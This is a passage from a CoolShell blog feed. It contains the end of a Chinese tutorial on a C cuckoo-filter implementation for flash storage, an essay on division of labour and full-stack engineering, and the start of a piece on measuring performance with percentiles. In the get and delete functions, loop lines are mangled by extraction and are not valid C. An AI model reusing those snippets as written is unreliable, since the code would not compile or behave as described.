<p>以上是flash的存储结构，至于哈希表里的slot有三个成员tag，status和offset，分别是哈希值，状态值和在flash的偏移位置。其中status有三个枚举值：AVAILIBLE，OCCUPIED，DELETED，分别表示这个slot是空闲的，占用的还是被删除的。至于tag，按理说应该有两个哈希值，对应两个哈希函数，但其中一个已经对应bucket的位置上了，所以我们只要保存另一个备用bucket的位置就行了，这样万一被踢，只要用这个tag就可以找到它的另一个安身之所。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">enum { AVAILIBLE, OCCUPIED, DELETED, };

/* The in-memory hash bucket cache is to filter keys (which is assumed SHA1) via
 * cuckoo hashing function and map keys to log entries stored on flash.
 */
struct hash_slot_cache {
        uint32_t tag : 30;  /* summary of key */
        uint32_t status : 2;  /* FSM */
        uint32_t offset;  /* offset on flash memory */
};
</pre>
<p>乍看之下size有点大是吗？没关系，你也可以根据情况调整数据类型大小，比如uint16_t，这里仅仅为了测试正确性。</p>
<p>至于哈希表以及bucket和slot的创建见初始化代码。buckets是一个二级指针，每个bucket指向4个slot大小的缓存，即4路slot，那么bucket_num也就是slot_num的1/4。这里我们故意把slot_num调小了点，为的是测试rehash的发生。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define ASSOC_WAY  (4)  /* 4-way association */

struct hash_table {
    struct hash_slot_cache **buckets;
    struct hash_slot_cache *slots;
    uint32_t slot_num;
    uint32_t bucket_num;
};

int cuckoo_filter_init(size_t size)
{
    ...
    /* Allocate hash slots */
    hash_table.slot_num = nvrom_size / SECTOR_SIZE;
    /* Make rehashing happen */
    hash_table.slot_num /= 4;
    hash_table.slots = calloc(hash_table.slot_num, sizeof(struct hash_slot_cache));
    if (hash_table.slots == NULL) {
        return -1;
    }

    /* Allocate hash buckets associated with slots */
    hash_table.bucket_num = hash_table.slot_num / ASSOC_WAY;
    hash_table.buckets = malloc(hash_table.bucket_num * sizeof(struct hash_slot_cache *));
    if (hash_table.buckets == NULL) {
        free(hash_table.slots);
        return -1;
    }
    for (i = 0; i &lt; hash_table.bucket_num; i++) {
        hash_table.buckets[i] = &amp;hash_table.slots[i * ASSOC_WAY];
    }
}
</pre>
<p>下面是哈希函数的设计，这里有两个，前面提到既然key是20字节的SHA1值，我们就可以分别是对key的低32位和高32位进行位运算，只要bucket_num满足2的幂次方，我们就可以将key的一部分同bucket_num – 1相与，就可以定位到相应的bucket位置上，注意bucket_num随着rehash而增大，哈希函数简单的好处是求哈希值十分快。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define cuckoo_hash_lsb(key, count)  (((size_t *)(key))[0] &amp; (count - 1))
#define cuckoo_hash_msb(key, count)  (((size_t *)(key))[1] &amp; (count - 1))
</pre>
<p>终于要讲解cuckoo filter最重要的三个操作了——查询、插入还有删除。查询操作是简单的，我们对传进来的参数key进行两次哈希求值tag[0]和tag[1]，并先用tag[0]定位到bucket的位置，从4路slot中再去对比tag[1]。只有比中了tag后，由于只是key的一部分，我们再去从flash中验证完整的key，并把数据在flash中的偏移值read_addr输出返回。相应的，如果bucket[tag[0]]的4路slot都没有比中，我们再去bucket[tag[1]]中比对（代码略），如果还比不中，可以肯定这个key不存在。<strong>这种设计的好处就是减少了不必要的flash读操作，每次比对的是内存中的tag而不需要完整的key。</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static int cuckoo_hash_get(struct hash_table *table, uint8_t *key, uint8_t **read_addr)
{
    int i, j;
    uint8_t *addr;
    uint32_t tag[2], offset;
    struct hash_slot_cache *slot;

    tag[0] = cuckoo_hash_lsb(key, table-&gt;bucket_num);
    tag[1] = cuckoo_hash_msb(key, table-&gt;bucket_num);

    /* Filter the key and verify if it exists. */
    slot = table-&amp;gt;buckets[tag[0]];
    for (i = 0; i bucket_num) == slot[i].tag) {
        if (slot[i].status == OCCUPIED) {
            offset = slot[i].offset;
            addr = key_verify(key, offset);
            if (addr != NULL) {
                if (read_addr != NULL) {
                    *read_addr = addr;
                }
                break;
            }
        } else if (slot[i].status == DELETED) {
            return DELETED;
        }
    }
    ...
}</pre>
<p>接下来先将简单的删除操作，之所以简单是因为delete除了将相应slot的状态值设置一下之外，其实什么都没有干，也就是说它不会真正到flash里面去把数据清除掉。为什么？很简单，没有必要。还有一个原因，flash的写操作之前需要擦除整个页面，这种擦除是会折寿的，<strong>所以很多flash支持随机读，但必须保持顺序写。</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static void cuckoo_hash_delete(struct hash_table *table, uint8_t *key)
{
    uint32_t i, j, tag[2];
    struct hash_slot_cache *slot;

    tag[0] = cuckoo_hash_lsb(key, table-&gt;bucket_num);
    tag[1] = cuckoo_hash_msb(key, table-&gt;bucket_num);

    slot = table-&gt;buckets[tag[0]];
    for (i = 0; i bucket_num) == slot[i].tag) {
        slot[i].status = DELETED;
        return;
    }
    ...
}</pre>
<p>了解了flash的读写特性，你就知道为啥插入操作在flash层面要设计成append。不过我们这里不讨论过多flash细节，哈希表层面的插入逻辑其实跟查询差不多，我就不贴代码了。这里要贴的是如何判断并处理碰撞，其实这里也没啥玄机，就是用old_tag和old_offset保存一下临时变量，以便一个元素被踢出去之后还能找到备用的安身之所。但这里会有一个判断，每次踢人都会计数，当alt_cnt大于512时候表示哈希表真的快满了，这时候需要rehash了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static int cuckoo_hash_collide(struct hash_table *table, uint32_t *tag, uint32_t *p_offset)
{
    int i, j, k, alt_cnt;
    uint32_t old_tag[2], offset, old_offset;
    struct hash_slot_cache *slot;

    /* Kick out the old bucket and move it to the alternative bucket. */
    offset = *p_offset;
    slot = table-&gt;buckets[tag[0]];
    old_tag[0] = tag[0];
    old_tag[1] = slot[0].tag;
    old_offset = slot[0].offset;
    slot[0].tag = tag[1];
    slot[0].offset = offset;
    i = 0 ^ 1;
    k = 0;
    alt_cnt = 0;

KICK_OUT:
    slot = table-&gt;buckets[old_tag[i]];
    for (j = 0; j &lt; ASSOC_WAY; j++) {
        if (offset == INVALID_OFFSET &amp;&amp; slot[j].status == DELETED) {
            slot[j].status = OCCUPIED;
            slot[j].tag = old_tag[i ^ 1];
            *p_offset = offset = slot[j].offset;
            break;
        } else if (slot[j].status == AVAILIBLE) {
            slot[j].status = OCCUPIED;
            slot[j].tag = old_tag[i ^ 1];
            slot[j].offset = old_offset;
            break;
        }
    }

    if (j == ASSOC_WAY) {
        if (++alt_cnt &gt; 512) {
            if (k == ASSOC_WAY - 1) {
                /* Hash table is almost full and needs to be resized */
                return 1;
            } else {
                k++;
            }
        }
        uint32_t tmp_tag = slot[k].tag;
        uint32_t tmp_offset = slot[k].offset;
        slot[k].tag = old_tag[i ^ 1];
        slot[k].offset = old_offset;
        old_tag[i ^ 1] = tmp_tag;
        old_offset = tmp_offset;
        i ^= 1;
        goto KICK_OUT;
    }

    return 0;
}</pre>
<p>rehash的逻辑也很简单，无非就是把哈希表中的buckets和slots重新realloc一下，空间扩展一倍，然后再从flash中的key重新插入到新的哈希表里去。这里有个陷阱要注意，<strong>千万不能有相同的key混进来！</strong>虽然cuckoo hashing不像开链法那样会退化成O(n)，但由于每个元素有两个哈希值，而且每次计算的哈希值随着哈希表rehash的规模而不同，相同的key并不能立即检测到冲突，但当相同的key达到一定规模后，噩梦就开始了，由于rehash里面有插入操作，一旦在这里触发碰撞，又会触发rehash，这时就是一个rehash不断递归的过程，由于其中老的内存没释放，新的内存不断重新分配，整个程序就如同陷入DoS攻击一般瘫痪了。<strong>所以每次插入操作前一定要判断一下key是否已经存在过，并且对rehash里的插入使用碰撞断言防止此类情况发生。</strong>笔者在测试中不幸中了这样的彩蛋，调试了大半天才搞清楚原因，搞IT的同学们记住一定要防小人啊~</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static void cuckoo_rehash(struct hash_table *table)
{
    ...
    uint8_t *read_addr = nvrom_base_addr;
    uint32_t entries = log_entries;
    while (entries--) {
        uint8_t key[20];
        uint32_t offset = read_addr - nvrom_base_addr;
        for (i = 0; i &amp;lt; 20; i++) {
            key[i] = flash_read(read_addr);
            read_addr++;
        }
        /* Duplicated keys in hash table which can cause eternal
         * hashing collision! Be careful of that!
         */
        assert(!cuckoo_hash_put(table, key, &amp;offset));
        if (cuckoo_hash_get(&amp;old_table, key, NULL) == DELETED) {
            cuckoo_hash_delete(table, key);
        }
        read_addr += DAT_LEN;
    }
    ...
}</pre>
<p>到此为止代码的逻辑还是比较简单，使用效果如何呢？我来帮你找个大文件<a href="https://github.com/unqlite/unqlite/blob/master/unqlite.c" target="_blank">unqlite.c</a>测试一下，这是一个嵌入式数据库源代码，共59959行代码。作为需要导入的文件，编译我们的cuckoo filter，然后执行：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">./cuckoo_db unqlite.c output.c</code></p>
<p>你会发现生成output.c正好也是59959行代码，一分不差，probably yes终于变成了definitely yes。同时也可以看到，cuckoo filter真的很快！如果你想看hashing的整个过程，可以参照<a href="https://github.com/begeekmyfriend/CuckooFilter/blob/master/README.md" target="_blank">README</a>里把调试宏打开。最后，欢迎给<a href="https://github.com/begeekmyfriend/CuckooFilter" target="_blank">这个小玩意</a>提交PR！</p>
<h4>参考资料</h4>
<p>Cuckoo Filter的<a href="https://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pdf" target="_blank">论文</a>和<a href="https://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pptx" target="_blank">PPT</a>：Cuckoo Filter: Practically Better Than Bloom</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-09-02T09:18:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/17225.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 让我们来谈谈分工 ]]></title>
<link>https://coolshell.cn/articles/17295.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >昨天，我看到<a href="http://spectrum.ieee.org/view-from-the-valley/computing/software/yahoos-engineers-move-to-coding-without-a-net" target="_blank">一个新闻</a>——雅虎取消了QA团队，工程师必须自己负责代码质量，并使用持续集成代替QA。 同时，也听到网友说，“听微软做数据库运维的工程师介绍，他们也是把运维工程师和测试工程师取消了，由开发全部完成。每个人都是全栈工程师”。于是，我顺势引用了几年前写过一篇文章《<a href="https://coolshell.cn/articles/6994.html" target="_blank">我们需要专职的QA吗？</a>》，并且又鼓吹了一下全栈。当然，一如既往的得到了一些的争议和嘲弄;-)。</p>
<p>有人认为取消QA基本上是公司没钱的象征，这个观点根本不值一驳，属于井底之蛙。有人认为，社会分工是大前提，并批评我说怎么不说把所有的事全干的，把我推向了另外一个极端。另外，你千万不要以为有了分工，QA的工作就保得住了。</p>
<p>就像《乔布斯传》中乔布斯质疑财务制度的时候说的，有时候，很多人都不问为什么，觉得存在的东西都是理所应当的东西。让我们失去了独立思考的机会。分工也是一样。</p>
<p>所以，为了说完整分工这个逻辑。请大家耐住性子，让我就先来谈谈“分工的优缺点”吧。</p>
<p><span id="more-17295"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%88%86%E5%B7%A5%E7%9A%84%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9" title="分工的优点和缺点">分工的优点和缺点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%85%A8%E7%90%83%E5%8C%96%E4%B8%8B%E7%9A%84%E5%88%86%E5%B7%A5" title="全球化下的分工">全球化下的分工</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%88%86%E5%B7%A5%E7%9A%84%E6%B8%A9%E5%BA%8A%E5%92%8C%E5%A4%A9%E6%95%8C" title="分工的温床和天敌">分工的温床和天敌</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BB%80%E4%B9%88%E6%A0%B7%E5%88%86%E5%B7%A5%E6%89%8D%E6%98%AF%E5%A5%BD%E7%9A%84" title="什么样分工才是好的">什么样分工才是好的</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%B0%8F%E7%BB%93" title="小结">小结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%88%86%E5%B7%A5%E7%9A%84%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9"></span>分工的优点和缺点<span class="ez-toc-section-end"></span>
</h4>
<p>首先，分工（Division of Labour）应该是由 <a href="https://en.wikipedia.org/wiki/Adam_Smith" target="_blank">Adam Smith</a> 在1776年的《<a href="https://en.wikipedia.org/wiki/The_Wealth_of_Nations" target="_blank">国富论</a>》中提出来的，Adam在那时候就观察到分工对于手工业生产效率的提高。他将效率提高的原因归结于三点：</p>
<ul>
<li>熟练程度的增加。当一个工人单纯地重复同一道工序时，其对这道工序的熟练程度会大幅增加。<strong>表现为产量和质量的提高</strong>。</li>
<li>如果没有分工，由一道工序转为另一道工序时会损失时间，而分工避免了这中间的损失。</li>
<li>由于对于工序的了解和熟练度的增加，<strong>更有效率的机械和工具被发明出来，从而提高了产量</strong>。</li>
</ul>
<p>分工的确是提高生产力。我想到了福特公司一开始做出来的汽车几乎卖不出去，原因有两个，一个是成本太高，另外是生产太复杂，产能太低。于是福特公司开始把制造一辆汽车的工序分解开来，进行分工，分工给福特公司带来的好处是：</p>
<ol>
<li>很多工作可以并行了，而且<strong>因为事情变得简单后，执行力也变强了</strong>
</li>
<li>一个非常复杂和高深的汽车制造因为分工后，<strong>很多工作不需要很NB的人来干了，只需要一般劳动者经过简单的培训就可以干了</strong>。而且，越干越熟练，越干越专业，最终可能让合适的人合适的事。</li>
<li>分工后导致了很多重复劳动可以用技术来解决，于是福特公司出现生产流水线的技术（你是否还记得卓别林《摩登时代》里的工业生产流水线的场景，那取自福特公司）。</li>
</ol>
<p>于是，福特公司的生产效率大大提高，最终实现了让每个美国家庭都能买得起汽车的理想，同时让美国成为了轮子上的国家。</p>
<p>不过，我们需要注意的是，在《国富论》中，Adam他同时也提到，分工如果过细，同样会带来问题——<strong>简单重复的劳动会让人变成一个不会思考的机器，从而越来越笨，进而变成平庸的无技能的人</strong>。自“分工”出现以后，争论就没有停止过。</p>
<p>Karl Max同样认为<strong>分工越来越细，会导致人的技术越来越差，同时，大量的重复劳动也会导致人对工作的失出热情，产生厌倦和抵触心理，最终会导致生产力的下降</strong>。</p>
<p>同时，还有一些经济学家也同样表明分工的一些缺点：</p>
<ul>
<li>
<strong>导致人只关注整个事情中的一小块，缺乏全局视角，导致视野受限，没有完全领会工作的意义和目标，从而导致各种返工</strong>。</li>
</ul>
<ul>
<li>
<strong>对于组织而言，分工也会导致出现大量的沟通协同成本，并出现碎片的生产方式，以及组织的孤岛形式，并不利于提高生产力</strong>。</li>
</ul>
<p>当然，奥地利经济学家<a title="Ludwig von Mises" href="https://en.wikipedia.org/wiki/Ludwig_von_Mises">Ludwig von Mises</a> 并不这么认为，他认为，在分工所得到的好处面前，这些副作用不算什么。并且，他认为在资本主义的制度下，完全是可以平衡分工的各种优点和各种缺点，从而可以达到提高生产力和提高人员素质的双赢解的。</p>
<p>比如说，<strong>分工中的各种沟通问题是可以通过一个标准协议来解的</strong>，造灯泡的，造开关的，造灯座的完全不知道对方的存在，他们只所以可以让做出来的东西拼在一起，完全是通过了一种标准协议完成的。<strong>这也是为什么这个世界上有各种各样的标准化的组织</strong>。</p>
<p>还有很多经济学家对分工都有自己的见解和想法。不过基本上就是上面这些Pros和Cons了。下图是一个PPT的两个slids，可以点击看大图（<a href="http://www.slideshare.net/kamran121/lecture-5-10123392" target="_blank">来源</a>）</p>
<table>
<tbody>
<tr>
<td><a href="https://coolshell.cn/wp-content/uploads/2015/12/lecture-5-10-728.jpg" target="_blank"><img alt="image placeholder" ></a></td>
<td><a href="https://coolshell.cn/wp-content/uploads/2015/12/lecture-5-11-728.jpg" target="_blank"><img alt="image placeholder" ></a></td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="%E5%85%A8%E7%90%83%E5%8C%96%E4%B8%8B%E7%9A%84%E5%88%86%E5%B7%A5"></span>全球化下的分工<span class="ez-toc-section-end"></span>
</h4>
<p>分工带来问题在全球化的浪潮下变得尤为突出。其委婉地被讲成是比较优势（<a title="Comparative advantage" href="https://en.wikipedia.org/wiki/Comparative_advantage">Comparative Advantage</a>）</p>
<p><b>比较优势（</b>又叫<b>相对优势</b>）是经济学的概念，解释了为何在拥有相对的机会成本的优势下生产，贸易对双方都有利。当一方（一个人，一间公司，或一国）进行一项生产时所付出的机会成本比另一方低，这一方面拥有了进行这项生产的比较优势。于是，一个国家倘若专门生产自己相对优势较大的产品，并通过国际贸易换取自己不具有相对优势的产品就能获得利益。</p>
<p>于是乎，分工本来想要的是——合适的人干合适的事，<strong>但是在比较优势的情况下，商业社会把分工变成了</strong>——<strong>不是选择合适的人、公司或国家，而是选择成本低的人、公司或国家</strong>。</p>
<p>经济合作与发展组织<a class="mw-redirect" title="OECD" href="https://en.wikipedia.org/wiki/OECD">OECD</a>最近（2015年6月28日）对全球化这样建议的——</p>
<blockquote><p>“有效率的政策的本质不是阻止失业而是鼓励就业，如果各个国家都在收获全球化的利益而不是开放贸易的话，那么一些地方就会失去工作机会，当然也伴随着在另一些地方出现新的工作机会，这是全球化进程不可避免的，而我们面对的挑战是怎么能流畅调整我们的流程，能为那些新出现的工作机会找到合适的技能匹配的工人”。</p></blockquote>
<p>通过上面的说明，我想你可以知道，为什么中国成为了世界劳动力大国，而为什么当初美国科技公司进入中国的时候，首先把测试的工作放到了中国。这就是所谓的全球化分工。同时我们也可以看到，像我们中国这样技术能力的确非常不足的国家，的确是可以通过分工这种形式，让我们这些技能一般的技术人员参与一个复杂的有技术含量的项目当中。这其中就是分工的光明面和阴暗面。</p>
<p>那么，我们想一想，<strong>随着中国的人力成本的越来越大，国际化的分工因为商业资本的因素，必然不会选择中国，只会选择人力成本更低的国家，比如印度、越南、甚至人力成本更低的国家</strong>。美国雅虎和Adobe不是离开中国了么？再看看中国因为人民币的汇率或是人力成本的上升，我们在早几年关了多少个Made in China的工厂，这就是全球化的分工，商业上来说，他不是找最合适的人，而是找成本最低的人。</p>
<p>所以，<strong>你千万不要以为我一提倡全栈了，你QA的工作就保不住了，就算没有全栈，就算是你还在坚持的社会化的分工，也可能让你的QA的工作就保不住了，除非，你能提供更低的价格</strong>。（想想这其中的逻辑吧，人家美国人把一些技术工作（比如测试）外包到中国的原因不是因为中国人聪明，想得周全，适合干这个测试这个事，而是因为中国人廉价，所以，当中国不在廉价了，自然就会找更廉价的地方了）</p>
<p>为什么国家要从Made in China转型？不就是因为中国早期拿到的国际化分工就是这些没有技术含量的支持性的分工么？也因此而造就了大量的技能很一般的工人。为了能在全球化分工中能拿到更有质量的工作，<strong>我们必然要从劳动密集型转向成知识密集型，必然要从支持性的工作转变为产出性的工作，必然需要单一技能型的技工转变为复合型的人才</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%88%86%E5%B7%A5%E7%9A%84%E6%B8%A9%E5%BA%8A%E5%92%8C%E5%A4%A9%E6%95%8C"></span>分工的温床和天敌<span class="ez-toc-section-end"></span>
</h4>
<p><strong>分工的温床主要有两个</strong>，</p>
<ul>
<li>
<strong>一个是成本和效率</strong>，资本家或企业主或一个国家为了追求更快成本更底的生产方式，他们必然会进行大规模的分工，伴随着分工，他们也会把一些知识或技术密集型的工作生生地变成劳动密集型的工作。然后层层外包。</li>
</ul>
<ul>
<li>
<strong>一个是组织的大小</strong>，当一个组织的人数不断的变大，那么，你只能把工作和任务分得更细。这是被人数逼的，而不是实际需要的。这就是为什么我们可以看到很多大公司里要么人浮于事，要么瞎忙。</li>
</ul>
<p><strong>分工的天敌主要有一个——那就是技术</strong>！</p>
<p style="padding-left: 30px;">每当新技术出现的时候，一些复杂的工序会被一台机器或是一种高超的技术所取代，不管是被技术自动化，还是被技术所简化<strong>，</strong>总之，以前本来需要数十人或是数百人才能干的事，突然之间只需要一个人就可以干完了。生产力得到了巨大的释放。所以，你这就是我们常听的——<strong>科技是第一生产力！</strong></p>
<p>说到这里，让我们再来看看雅虎的那条新闻——</p>
<blockquote><p>在软件开发流程中去掉QA团队会发生什么？更少的代码错误，更快的开发周期。这是雅虎工程师过去一年的实验结果。<strong>雅虎的Warp Drive计划将程序开发从批发布转移了持续交付模式</strong>，工程师的代码不经过QA团队的人工检查而是直接发布。<strong>开发模式的转变导致了处理问题理念的根本性改变，迫使工程师开发自动检查工具去识别原来由人工检查发现的错误</strong>。雅虎的技术团队现在全部是工程师，而不再有QA团队容身之处。雅虎的首席架构师 Amotz Maimon说，他们本来预计可能会发生严重问题，结果出乎意料，每个曾经对此抱有怀疑态度的人都说新做法很有效。</p></blockquote>
<p>所以，<strong>当你面对一些难题的时候，比如线上的故障，或是一个复杂的软件生产活动，你是要加更多的流程更多的人呢，还是要用技术解决问题呢？一边是温床，一边是天敌，你想好了吗？</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%A0%B7%E5%88%86%E5%B7%A5%E6%89%8D%E6%98%AF%E5%A5%BD%E7%9A%84"></span>什么样分工才是好的<span class="ez-toc-section-end"></span>
</h4>
<p>分工是必然的，因为很简单，你不可能一个人干完所有的事情，所以必需要分工，<strong>分工不是问题，而问题则变成了——什么样的分工是理想的，是优雅的，是有效率的？</strong></p>
<figure id="attachment_17302" aria-describedby="caption-attachment-17302" style="width: 212px" class="wp-caption alignright"><img alt="image placeholder" ><figcaption id="caption-attachment-17302" class="wp-caption-text"><strong><a href="https://zh.wikipedia.org/zh/%E5%8D%8E%E5%90%9B%E6%AD%A6" target="_blank">华君武</a>漫画《科学分工？》</strong></figcaption></figure>
<p>对于分工来说，一般来是一种组织和管理形为。就目前来说，现代的公司有两种分工模式，分别是<strong>Control</strong> 和 <strong>Commitment</strong> 这两种分工。</p>
<ul>
<li>
<strong>Control就是控制型的管理，它是一种是基于工作技能的分工，于是员工会被这种分工分配到一个比较窄的技能里去完成一个非常明确的工作</strong>。</li>
</ul>
<ul>
<li>
<strong>而Commitment则是面向员工的责任心和所承担的目标来分工并完成工作的。相比起前者来说，这样的分工在完成工作时，需要的不仅仅是技能，还需要更多的责任感</strong>。</li>
</ul>
<p>这么说吧，</p>
<ul>
<li>对于基于工作技能的分工，你会看到，这样的公司会把技术人员按编程语言来分，比如：Java、PHP、C/C++，或是分成：Web端、iOS端、Android端、后端、算法、数据。或是分成：开发，测试，运维。</li>
</ul>
<ul>
<li>对于基于Commitment的分工，你会看到他们这样分的，软件工程师（不分前后端，不分语言，不分运维，测试），因为这样的公司认为，他招的不是只有特定语言技能的Coder，而是而学多种语言多种技术能保证软件质量以及能对软件维护的软件工程师。这种公司的软件工程师是各种团队都可以去的，而他们的分工更多的是按软件的功能，软件的模块，或是软件的产品线来分工。</li>
</ul>
<p>基于技能的分工已是过去时，而基于 Commitment 的分工是更有效率的分工的未来。你可以参看McAlister-Kizzier, Donna. 的文献 “<a href="http://www.encyclopedia.com/topic/Division_of_labor.aspx#3" target="_blank">Division of Labor.</a>” 。</p>
<h4>
<span class="ez-toc-section" id="%E5%B0%8F%E7%BB%93"></span>小结<span class="ez-toc-section-end"></span>
</h4>
<p>我说了这么多，不知道你看懂了我想表达什么没有？我不强加我的价值观，只希望你自己问自己几个问题：</p>
<p style="padding-left: 30px;">1）作为工作的人，在分工中你会怎样选择？是成为一颗棋子，一颗螺丝钉，还是成为一个多面手？</p>
<p style="padding-left: 30px;">2）作为工作的人，当你选择工作或任务的时候，你是选择做支持性的工作，还是做产出性的工作？你是选择做劳动密集型重复工作，还是做知识密集型的创新性的工作？</p>
<p style="padding-left: 30px;">3）作为老板，你是想要什么样的员工？听话的只会加班和干重复工作的劳动力，还是有责任心的为企业和产品负责的员工？</p>
<p style="padding-left: 30px;">4）作为老板，你是想通过分工释放低端员工的生产力，还是通过科技或技术去创造更NB的生产力？</p>
<p style="padding-left: 30px;">5）作为老板，分工中的问题，你找到比较优的解了吗？比如，对于不同团队间的协议，你找到了吗？</p>
<p>可能，在不同的情况下你会有不同的答案。但是对我来说呢，无论是什么情况，我都只会有一个答案。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-12-13T12:55:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/17295.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 性能测试应该怎么做？ ]]></title>
<link>https://coolshell.cn/articles/17381.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >偶然间看到了阿里中间件<a href="http://dubbo.io/User+Guide-zh.htm#UserGuide-zh-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A" target="_blank">Dubbo的性能测试报告</a>，我觉得这份性能测试报告让人觉得做这性能测试的人根本不懂性能测试，我觉得这份报告会把大众带沟里去，所以，想写下这篇文章，做一点科普。</p>
<p>首先，这份测试报告里的主要问题如下：</p>
<p><strong>1）用的全是平均值</strong>。老实说，平均值是非常不靠谱的。</p>
<p><strong>2）响应时间没有和吞吐量TPS/QPS挂钩</strong>。而只是测试了低速率的情况，这是完全错误的。</p>
<p><strong>3）响应时间和吞吐量没有和成功率挂钩。</strong></p>
<p><span id="more-17381"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B9%B3%E5%9D%87%E5%80%BC%E4%B8%8D%E9%9D%A0%E8%B0%B1" title="为什么平均值不靠谱">为什么平均值不靠谱</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%EF%BC%88latency%EF%BC%89%E8%A6%81%E5%92%8C%E5%90%9E%E5%90%90%E9%87%8F%EF%BC%88Thoughput%EF%BC%89%E6%8C%82%E9%92%A9" title="为什么响应时间（latency）要和吞吐量（Thoughput）挂钩">为什么响应时间（latency）要和吞吐量（Thoughput）挂钩</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E5%90%9E%E5%90%90%E9%87%8F%E5%92%8C%E6%88%90%E5%8A%9F%E7%8E%87%E8%A6%81%E6%8C%82%E9%92%A9" title="为什么响应时间吞吐量和成功率要挂钩">为什么响应时间吞吐量和成功率要挂钩</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%A6%82%E4%BD%95%E4%B8%A5%E8%B0%A8%E5%9C%B0%E5%81%9A%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95" title="如何严谨地做性能测试">如何严谨地做性能测试</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B9%B3%E5%9D%87%E5%80%BC%E4%B8%8D%E9%9D%A0%E8%B0%B1"></span>为什么平均值不靠谱<span class="ez-toc-section-end"></span>
</h4>
<p>关于平均值为什么不靠谱，我相信大家读新闻的时候经常可以看到，<strong>平均工资</strong>，<strong>平均房价</strong>，<strong>平均支出</strong>，等等这样的字眼，<span id="zoom" class="show_c">你就知道为什么平均值不靠谱了。（这些都是数学游戏，对于理工科的同学来说，天生应该有免疫力）</span></p>
<p>软件的性能测试也一样，平均数也是不靠谱的，这里可以参看这篇详细的文章《<a href="http://apmblog.dynatrace.com/2012/11/14/why-averages-suck-and-percentiles-are-great/" target="_blank">Why Averages Suck and Percentiles are Great</a>》，我在这里简单说一下。</p>
<p>我们知道，性能测试时，测试得到的结果数据不总是一样的，而是有高有低的，如果算平均值就会出现这样的情况，假如，测试了10次，有9次是1ms，而有1次是1s，那么平均数据就是100ms，很明显，这完全不能反应性能测试的情况，也许那1s的请求就是一个不正常的值，是个噪点，应该去掉。所以，我们会在一些评委打分中看到要去掉一个最高分一个最低分，然后再算平均值。</p>
<p>另外，中位数（Mean）可能会比平均数要稍微靠谱一些，所谓中位数的意就是把将一组数据按大小顺序排列，处在最中间位置的一个数叫做这组数据的中位数 ，这意味着至少有50%的数据低于或高于这个中位数。</p>
<p>当然，最为正确的统计做法是用百分比分布统计。也就是英文中的TP – Top Percentile ，TP50的意思在，50%的请求都小于某个值，TP90表示90%的请求小于某个时间。</p>
